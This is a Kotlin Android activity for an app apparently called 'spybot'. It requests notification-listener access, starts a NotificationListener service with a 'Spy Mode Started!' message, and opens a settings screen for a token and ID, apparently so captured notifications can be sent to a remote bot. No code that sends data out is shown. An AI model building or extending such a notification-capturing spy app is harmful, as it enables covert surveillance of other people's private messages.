package com.example.spybot

import android.Manifest
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var btnStart: Button
    private lateinit var btnSettings: Button
    private lateinit var tvStatus: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        btnStart = findViewById(R.id.btn_start)
        btnSettings = findViewById(R.id.btn_settings) // New Button
        tvStatus = findViewById(R.id.tv_status)

        checkPermission()
        
        btnStart.setOnClickListener {
            startService(Intent(this, NotificationListener::class.java))
            Toast.makeText(this, "Spy Mode Started!", Toast.LENGTH_SHORT).show()
        }

        // ✅ Open Settings to enter Token/ID
        btnSettings.setOnClickListener {
            startActivity(Intent(this, SettingsActivity::class.java))
        }
    }

    private fun checkPermission() {
        val hasNotificationPermission = checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        
        if (!hasNotificationPermission) {
            requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101)
        }

        val listenerEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners").contains(packageName)
        
        if (!listenerEnabled) {
            tvStatus.text = "Please enable Notification Access in Settings."
            btnStart.isEnabled = false
            
            // Direct link to Notification Access Settings
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        } else {
            tvStatus.text = "System Ready. Press Start."
            btnStart.isEnabled = true
        }
    }
}
